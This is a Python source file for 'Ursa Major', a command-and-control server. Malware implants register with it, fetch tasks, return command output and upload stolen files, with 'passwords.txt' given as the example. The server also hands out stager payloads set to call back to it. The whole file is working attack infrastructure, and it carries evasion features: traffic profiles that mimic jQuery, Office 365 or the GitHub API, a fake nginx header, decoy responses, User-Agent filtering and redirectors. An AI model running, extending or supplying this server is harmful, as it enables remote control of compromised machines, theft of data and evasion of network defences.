#!/usr/bin/env python3
"""
Ursa Major — C2 HTTP/HTTPS Server
====================================
The always-running daemon that implants beacon back to.

Default endpoints (can be remapped by traffic profiles):
    POST /register     — New implant registers, gets session ID + key
    POST /beacon       — Implant checks in, gets pending tasks
    POST /result       — Implant returns task results
    POST /upload       — Implant uploads a file (exfil)
    GET  /download/<id> — Implant downloads a file (delivery)
    GET  /stage        — Serve a stager payload

Advanced features (Phase 6):
    - TLS/HTTPS: set major.tls.enabled=true in ursa.yaml
    - Traffic profiles: set major.traffic_profile=jquery|office365|github-api
    - HTTP redirector: set major.redirector.enabled=true

All comms are encrypted with per-session AES keys after registration.
HTTP looks like normal web traffic (JSON API responses).

Run:
    python3 major/server.py [--port 8443] [--host 0.0.0.0] [--tls] [--profile jquery]
"""

import argparse
import base64
import json
import os
import sys
import threading
import time
from datetime import UTC, datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

# Add parent to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from implants.builder import Builder as _PayloadBuilder
from major.cert import build_ssl_context, ensure_cert
from major.config import get_config, reload_config
from major.crypto import UrsaCrypto, generate_session_key
from major.profiles import TrafficProfile, get_profile
from major.redirector import redirector_from_config
from major.db import (
    complete_task,
    create_session,
    get_file,
    get_pending_tasks,
    get_session,
    get_task,
    init_db,
    list_sessions,
    log_event,
    store_file,
    update_session_checkin,
    update_session_info,
)

# ── Configuration (loaded from ursa.yaml with defaults) ──

_cfg = get_config()
DEFAULT_PORT = _cfg.get("major.port", 8443)
DEFAULT_HOST = _cfg.get("major.host", "0.0.0.0")
STALE_THRESHOLD = _cfg.get("major.stale_threshold", 300)
SERVER_HEADER = _cfg.get("major.server_header", "nginx/1.24.0")
REAPER_INTERVAL = _cfg.get("major.reaper_interval", 30)

# Active traffic profile — controls URL routing and response headers
_profile: TrafficProfile = get_profile(_cfg.get("major.traffic_profile", "default"))


class UrsaC2Handler(BaseHTTPRequestHandler):
    """HTTP request handler for C2 communications."""

    # Suppress default logging — we log our own way
    def log_message(self, format, *args):
        pass

    def _send_json(self, data, status=200):
        """Send a JSON response with active profile headers."""
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        # Server header and extra headers from active traffic profile
        self.send_header("Server", _profile.server_header)
        self.send_header("X-Request-Id", os.urandom(8).hex())
        for key, val in _profile.response_headers.items():
            self.send_header(key, val)
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        """Read request body as JSON."""
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            return {}
        raw = self.rfile.read(length)
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return {"raw": raw.decode("utf-8", errors="replace")}

    def _get_client_ip(self):
        """Get the real client IP (respects X-Forwarded-For)."""
        forwarded = self.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(",")[0].strip()
        return self.client_address[0]

    # ── Routes ──

    def do_GET(self):
        path = urlparse(self.path).path
        rev = _profile.reverse_map()
        dl_prefix = _profile.download_prefix()

        # Check User-Agent filter if profile requires it
        if _profile.user_agent_filter:
            ua = self.headers.get("User-Agent", "")
            if _profile.user_agent_filter not in ua:
                self._send_json({"error": "not found"}, 404)
                return

        # Root decoy
        if path == "/":
            self._send_json({
                "status": "ok",
                "version": "1.0",
                "timestamp": datetime.now(UTC).isoformat()
            })

        # Health check (always on fixed path for monitoring)
        elif path == "/health":
            self._send_json({"status": "healthy"})

        # Download: match profile download prefix
        elif path.startswith(dl_prefix + "/"):
            file_id = path[len(dl_prefix):].lstrip("/")
            self._handle_download(file_id)

        # Stage: profile-mapped path
        elif path == rev.get("stage", "/stage"):
            self._handle_stage()

        else:
            # Return 404 for unknown paths
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        path = urlparse(self.path).path
        body = self._read_body()
        rev = _profile.reverse_map()

        # Check User-Agent filter if profile requires it
        if _profile.user_agent_filter:
            ua = self.headers.get("User-Agent", "")
            if _profile.user_agent_filter not in ua:
                self._send_json({"error": "not found"}, 404)
                return

        logical = rev.get(path)

        if logical == "register":
            self._handle_register(body)
        elif logical == "beacon":
            self._handle_beacon(body)
        elif logical == "result":
            self._handle_result(body)
        elif logical == "upload":
            self._handle_upload(body)
        else:
            self._send_json({"error": "not found"}, 404)

    # ── Handlers ──

    def _handle_register(self, body):
        """New implant registering with the C2.

        Expected body:
            {
                "hostname": "WORKSTATION1",
                "username": "admin",
                "os": "Windows 10",
                "arch": "x64",
                "pid": 1234,
                "process": "svchost.exe"
            }
        """
        client_ip = self._get_client_ip()
        session_key = generate_session_key()

        session_id = create_session(
            remote_ip=client_ip,
            hostname=body.get("hostname", "unknown"),
            username=body.get("username", "unknown"),
            os_info=body.get("os", "unknown"),
            arch=body.get("arch", "unknown"),
            pid=body.get("pid", 0),
            process_name=body.get("process", "unknown"),
            campaign=body.get("campaign", ""),
            tags=body.get("tags", ""),
            encryption_key=session_key,
            beacon_interval=body.get("interval", 5),
            jitter=body.get("jitter", 0.1),
        )

        _log(f"[+] New session: {session_id} — {body.get('username', '?')}@{body.get('hostname', '?')} ({client_ip})")

        self._send_json({
            "session_id": session_id,
            "key": session_key,
            "interval": body.get("interval", 5),
            "jitter": body.get("jitter", 0.1),
        })

    def _handle_beacon(self, body):
        """Implant checking in for tasks.

        Expected body:
            {
                "session_id": "abc12345",
                "data": "<encrypted beacon data or empty>"
            }
        """
        session_id = body.get("session_id")
        if not session_id:
            self._send_json({"error": "missing session_id"}, 400)
            return

        session = get_session(session_id)
        if not session:
            self._send_json({"error": "unknown session"}, 404)
            return

        # Update last seen
        client_ip = self._get_client_ip()
        update_session_checkin(session_id, client_ip)

        # Get pending tasks
        pending = get_pending_tasks(session_id)

        tasks_out = []
        for task in pending:
            tasks_out.append({
                "id": task["id"],
                "type": task["task_type"],
                "args": json.loads(task["args"]) if isinstance(task["args"], str) else task["args"],
            })

        # If we have the session key, encrypt the response
        if session.get("encryption_key") and body.get("encrypted"):
            crypto = UrsaCrypto(session["encryption_key"])
            encrypted_tasks = crypto.encrypt_json({"tasks": tasks_out})
            self._send_json({"data": encrypted_tasks})
        else:
            self._send_json({"tasks": tasks_out})

    def _handle_result(self, body):
        """Implant returning task results.

        Expected body:
            {
                "session_id": "abc12345",
                "task_id": "def67890",
                "result": "command output...",
                "error": ""
            }
        """
        session_id = body.get("session_id")
        task_id = body.get("task_id")

        if not session_id or not task_id:
            self._send_json({"error": "missing fields"}, 400)
            return

        session = get_session(session_id)
        if not session:
            self._send_json({"error": "unknown session"}, 404)
            return

        # Handle encrypted results
        result_data = body.get("result", "")
        error_data = body.get("error", "")

        if body.get("encrypted") and session.get("encryption_key"):
            try:
                crypto = UrsaCrypto(session["encryption_key"])
                decrypted = crypto.decrypt_json(body["data"])
                result_data = decrypted.get("result", "")
                error_data = decrypted.get("error", "")
            except Exception as e:
                error_data = f"Decryption failed: {e}"

        complete_task(task_id, result=result_data, error=error_data)
        update_session_checkin(session_id)

        task = get_task(task_id)
        if task:
            status = "ERROR" if error_data else "OK"
            _log(f"    [{status}] Task {task_id} ({task['task_type']}) — session {session_id}")

        self._send_json({"status": "ok"})

    def _handle_upload(self, body):
        """Implant uploading a file (exfiltration).

        Expected body:
            {
                "session_id": "abc12345",
                "filename": "passwords.txt",
                "data": "<base64 encoded file data>"
            }
        """
        session_id = body.get("session_id")
        if not session_id or not get_session(session_id):
            self._send_json({"error": "invalid session"}, 400)
            return

        filename = body.get("filename", "unknown")
        file_data = base64.b64decode(body.get("data", ""))

        file_id = store_file(session_id, filename, file_data, direction="download")
        _log(f"    [FILE] Received {filename} ({len(file_data)}B) from session {session_id}")

        self._send_json({"status": "ok", "file_id": file_id})

    def _handle_download(self, file_id):
        """Serve a file for implant to download."""
        f = get_file(file_id)
        if not f:
            self._send_json({"error": "file not found"}, 404)
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(f["data"])))
        self.end_headers()
        self.wfile.write(f["data"])

    def _handle_stage(self):
        """Serve a stager payload with the C2 URL baked in.

        Uses the payload builder to substitute URSA_C2_URL in stager.py so
        the served stager already knows where to phone home.  Falls back to
        the raw stager.py (token un-substituted) if the builder fails.
        """
        host, port = self.server.server_address
        cfg = get_config()
        public_url = cfg.get("major.public_url", "")
        if not public_url:
            # Derive from bind address; replace 0.0.0.0 with loopback as fallback
            effective_host = host if host not in ("0.0.0.0", "") else "127.0.0.1"
            public_url = f"http://{effective_host}:{port}"

        try:
            source = _PayloadBuilder().build_stager(public_url)
            payload = source.encode()
        except FileNotFoundError:
            # No stager.py present at all
            self._send_json({"error": "no stager configured"}, 404)
            return
        except Exception as exc:
            _log(f"[!] Stager build error: {exc}")
            self._send_json({"error": "stager build failed"}, 500)
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


# ── Session Reaper ──


def _session_reaper():
    """Background thread that marks stale sessions."""
    while True:
        try:
            sessions = list_sessions(status="active")
            now = time.time()
            for s in sessions:
                # If no beacon in 5x the interval, mark stale
                threshold = max(STALE_THRESHOLD, s.get("beacon_interval", 5) * 5)
                if now - s["last_seen"] > threshold:
                    update_session_info(s["id"], status="stale")
                    _log(f"[!] Session {s['id']} marked stale (no beacon for {int(now - s['last_seen'])}s)")
        except Exception:
            pass
        time.sleep(REAPER_INTERVAL)


# ── Logging ──


def _log(msg):
    """Print timestamped log message."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


# ── Main ──


def start_server(
    host=DEFAULT_HOST,
    port=DEFAULT_PORT,
    tls: bool = False,
    cert_path: str | None = None,
    key_path: str | None = None,
    profile_name: str | None = None,
):
    """Start the Ursa Major C2 server.

    Args:
        host: Bind address.
        port: Bind port.
        tls: Enable HTTPS (self-signed cert auto-generated if cert_path not set).
        cert_path: Path to TLS certificate PEM (optional, auto-generated if None).
        key_path: Path to TLS private key PEM (optional, auto-generated if None).
        profile_name: Traffic profile name (overrides ursa.yaml setting).
    """
    global _profile

    init_db()

    # Activate traffic profile
    if profile_name:
        _profile = get_profile(profile_name)
    cfg = get_config()
    if not profile_name:
        _profile = get_profile(cfg.get("major.traffic_profile", "default"))

    # Start reaper thread
    reaper = threading.Thread(target=_session_reaper, daemon=True)
    reaper.start()

    # Start redirector (if configured)
    redirector = redirector_from_config(cfg)
    if redirector:
        redirector.start()

    server = HTTPServer((host, port), UrsaC2Handler)

    # ── TLS wrapping ──────────────────────────────────────────────────────────
    use_tls = tls or cfg.get("major.tls.enabled", False)
    if use_tls:
        if not cert_path or not key_path:
            _cert, _key = ensure_cert(
                hostname=cfg.get("major.tls.hostname", ""),
                extra_sans=cfg.get("major.tls.extra_sans", []),
                days=cfg.get("major.tls.cert_days", 365),
            )
            cert_path = str(_cert)
            key_path  = str(_key)
        ctx = build_ssl_context(cert_path, key_path)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)

    protocol = "HTTPS" if use_tls else "HTTP"
    scheme   = "https" if use_tls else "http"

    # ── Startup banner ────────────────────────────────────────────────────────
    _log("=" * 58)
    _log("  URSA MAJOR — Command & Control Server")
    _log("=" * 58)
    _log(f"  Listening: {host}:{port}")
    _log(f"  Protocol:  {protocol}")
    _log(f"  Profile:   {_profile.name} — {_profile.description}")
    _log(f"  Database:  {os.path.abspath(os.path.join(os.path.dirname(__file__), 'ursa.db'))}")
    if redirector:
        _log(f"  Redirector: :{redirector.config.listen_port} → {scheme}://{host}:{port}")
    _log("")
    _log("  Endpoints:")
    rev = _profile.reverse_map()
    dl_prefix = _profile.download_prefix()
    for logical, path in _profile.urls.items():
        _log(f"    {logical:10s} → {path}")
    _log("=" * 58)
    _log("  Waiting for connections...")
    _log("")

    log_event("info", "server", f"Ursa Major C2 started on {host}:{port} ({protocol}, profile={_profile.name})")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        _log("\n[*] Shutting down...")
        server.shutdown()
        if redirector:
            redirector.stop()
        log_event("info", "server", "Ursa Major C2 stopped")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ursa Major C2 Server")
    parser.add_argument("--host",    default=None, help="Bind address")
    parser.add_argument("--port",    type=int, default=None, help="Bind port")
    parser.add_argument("--config",  default=None, help="Path to ursa.yaml")
    parser.add_argument("--cfg-profile", default=None, dest="cfg_profile",
                        help="ursa.yaml config profile to activate")
    parser.add_argument("--tls",     action="store_true", default=False,
                        help="Enable HTTPS (auto-generates self-signed cert)")
    parser.add_argument("--cert",    default=None, help="TLS certificate PEM path")
    parser.add_argument("--key",     default=None, help="TLS private key PEM path")
    parser.add_argument("--traffic-profile", default=None, dest="traffic_profile",
                        help="Traffic profile (default|jquery|office365|github-api)")
    args = parser.parse_args()

    # Reload config with yaml-profile/path if specified
    if args.cfg_profile or args.config:
        cfg = reload_config(path=args.config, profile=args.cfg_profile)
    else:
        cfg = get_config()

    host = args.host or cfg.get("major.host", DEFAULT_HOST)
    port = args.port or cfg.get("major.port", DEFAULT_PORT)

    start_server(
        host=host,
        port=port,
        tls=args.tls,
        cert_path=args.cert,
        key_path=args.key,
        profile_name=args.traffic_profile,
    )
